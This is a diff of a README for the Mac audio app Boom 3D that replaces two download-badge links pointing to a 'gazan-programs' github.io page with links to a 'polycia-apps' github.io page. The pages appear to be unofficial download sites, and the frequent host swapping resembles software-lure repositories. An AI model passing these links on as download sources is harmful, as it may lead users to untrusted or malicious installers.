@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gazan-programs.github.io/.github/boom3D">
+  <a href="https://polycia-apps.github.io/.github/boom3D">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Boom 3D"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The volume booster capability addresses a specific Mac frustration that is more 
 
 <p align="center">
 
-[![Get it Now Boom 3D](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/boom3D)
+[![Get it Now Boom 3D](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/boom3D)
 
 </p>
 
